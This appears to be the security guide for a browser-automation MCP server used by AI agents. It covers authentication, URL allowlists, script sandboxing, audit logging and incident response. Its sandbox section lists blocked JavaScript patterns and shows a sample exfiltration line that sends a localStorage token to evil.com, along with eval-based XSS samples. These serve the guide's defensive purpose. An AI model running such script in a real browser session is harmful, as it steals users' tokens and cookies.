# Security Best Practices

> Security guidelines for deploying the Browser Vision MCP Server

## Overview

The Browser Vision MCP Server executes browser automation on behalf of AI agents. This document outlines security considerations and best practices.

## Security Model

```
┌─────────────┐    Auth     ┌─────────────┐   Validate   ┌─────────────┐
│ MCP Client  │ ───────────► │   Server    │ ───────────► │   Tools     │
└─────────────┘              └─────────────┘              └─────────────┘
                                    │                            │
                                    ▼                            ▼
                           ┌─────────────┐               ┌─────────────┐
                           │ Rate Limiter│               │  Sandbox    │
                           └─────────────┘               └─────────────┘
```

## Authentication

### Token-Based Auth (Recommended)

```yaml
auth:
  mode: "token"
  token: "${MCP_AUTH_TOKEN}" # From environment
```

**Generate a secure token:**

```bash
openssl rand -hex 32
```

**Set environment variable:**

```bash
export MCP_AUTH_TOKEN="your-generated-token"
```

### No Auth (Development Only)

```yaml
auth:
  mode: "none"
```

⚠️ **Warning**: Only use in trusted, local development environments.

## URL Security

### HTTPS Enforcement

Always require HTTPS in production:

```yaml
security:
  requireHttps: true
```

### URL Allowlist

Restrict navigation to approved domains:

```yaml
security:
  urlAllowlist:
    - "https://*.company.com"
    - "https://trusted-vendor.com"
```

Patterns support:

- `*` wildcard for subdomains
- Path prefixes
- Port specifications

### Private IP Blocking

Prevent access to internal services:

```yaml
security:
  blockPrivateIps: true
```

Blocks:

- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`
- `127.0.0.0/8`
- `::1/128`

## Script Sandboxing

### Blocked JavaScript Patterns

Default blocked patterns prevent:

```yaml
security:
  blockedJsPatterns:
    # Code execution
    - "eval\\s*\\("
    - "Function\\s*\\("
    - "setTimeout\\s*\\([^,]*\\)"
    - "setInterval\\s*\\([^,]*\\)"

    # Storage access
    - "document\\.cookie"
    - "localStorage"
    - "sessionStorage"
    - "indexedDB"

    # Network requests
    - "fetch\\s*\\([^)]*\\)"
    - "XMLHttpRequest"
    - "WebSocket"

    # DOM manipulation risks
    - "document\\.write"
    - "document\\.open"
    - "document\\.execCommand"
```

### Safe JavaScript Examples

✅ **Allowed:**

```javascript
// Reading page content
return document.title;

// Simple calculations
return 2 + 2;

// Accessing elements (read-only)
return document.querySelector("h1")?.textContent;

// Data transformation
return Array.from(document.querySelectorAll("a")).map((a) => a.href);
```

❌ **Blocked:**

```javascript
// Dynamic code execution
eval("alert('xss')");
new Function("alert('xss')")();

// Storage access
localStorage.setItem("key", "value");
document.cookie;

// Network requests
fetch("https://evil.com/steal?data=" + localStorage.token);
```

## Session Security

### Isolation

Sessions are isolated by default:

```yaml
sessions:
  allowSharedSessions: false
```

### Timeout

Auto-close inactive sessions:

```yaml
sessions:
  timeoutMinutes: 30
```

### Limits

Prevent resource exhaustion:

```yaml
sessions:
  maxConcurrent: 10
  maxPerClient: 3
```

## Audit Logging

Enable comprehensive logging:

```yaml
security:
  auditLogging: true
  auditLogPath: "/var/log/clawtopus/audit.log"
```

### Logged Events

- Tool calls (name, args, result)
- Session lifecycle (create, access, close)
- Authentication attempts (success/failure)
- Security violations (blocked URLs, scripts)

### Log Format

```json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "level": "info",
  "action": "tool_call",
  "tool": "browser.navigate",
  "clientId": "claude-desktop-123",
  "args": { "url": "https://example.com" },
  "success": true,
  "duration": 1500
}
```

## Deployment Security

### Network Isolation

Run in isolated network segment:

```yaml
# Docker example
networks:
  mcp-network:
    internal: true # No external access
```

### Resource Limits

Prevent resource exhaustion:

```yaml
# Docker example
deploy:
  resources:
    limits:
      cpus: "2"
      memory: 4G
```

### File System Permissions

Restrict file system access:

```bash
# Read-only root filesystem
chmod 755 /app
chmod 644 /app/config.yaml

# Writable only specific directories
mkdir -p /tmp/sessions
chmod 700 /tmp/sessions
```

## Browser Security

### Profile Isolation

Use dedicated browser profiles:

```yaml
browserProfile: "mcp-sandbox"
```

### CDP Security

If using external Chrome:

1. Enable CDP only on localhost
2. Use authentication
3. Enable TLS for CDP connections

```bash
chrome --remote-debugging-port=9222 \
       --remote-debugging-address=127.0.0.1
```

## Security Checklist

### Production Deployment

- [ ] Authentication enabled (not `none`)
- [ ] HTTPS required for external URLs
- [ ] URL allowlist configured
- [ ] Private IPs blocked
- [ ] Session limits set
- [ ] Audit logging enabled
- [ ] Log files secured
- [ ] Network isolated
- [ ] Resource limits set
- [ ] Browser profile isolated

### Development

- [ ] Different auth token from production
- [ ] Localhost-only access
- [ ] Short session timeouts
- [ ] Verbose logging disabled

## Incident Response

### If Compromised

1. **Revoke tokens immediately**

   ```bash
   # Rotate auth token
   openssl rand -hex 32 > ~/.clawtopus/mcp-token
   ```

2. **Review audit logs**

   ```bash
   grep "clientId: <compromised-client>" /var/log/clawtopus/audit.log
   ```

3. **Close all sessions**

   ```bash
   clawtopus browser sessions --close-all
   ```

4. **Restart server**
   - Kill process
   - Start with new config

### Security Contacts

Report vulnerabilities to: security@clawtopus.ai

## Compliance

### Data Handling

- Screenshots may contain sensitive data
- Audit logs retain request/response metadata
- Session data is ephemeral (memory only)

### GDPR Considerations

- Audit logs contain IP addresses
- Screenshots may contain PII
- Implement data retention policies

```yaml
# Example: Disable audit logging for PII
security:
  auditLogging: false
```

### SOC 2 Alignment

- Access controls via auth tokens
- Audit trails for all actions
- Session timeouts enforced
- Resource limits prevent DoS

## Security Updates

Stay updated:

```bash
# Check for updates
npm outdated -g clawtopus

# Update
npm update -g clawtopus
```

Subscribe to security advisories:

- GitHub Security Advisories
- npm security alerts
